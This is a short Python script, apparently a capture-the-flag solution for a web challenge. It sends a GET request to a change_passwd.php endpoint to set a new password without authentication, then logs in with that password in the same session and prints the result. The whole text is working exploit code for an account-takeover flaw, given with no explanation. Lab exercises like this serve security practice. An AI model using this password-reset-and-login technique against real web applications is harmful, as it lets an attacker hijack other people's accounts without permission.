import requests

response = requests.session()
reset_url = "http://h3.l1n3.net:20180/web12_d7d1/change_passwd.php?passwd=123&passwd_confirm=123"
relogin_url = "http://h3.l1n3.net:20180/web12_d7d1/login_check.php?passwd=123"
requests1 = response.get(reset_url)
requests2 = response.get(relogin_url)
print(requests2.text)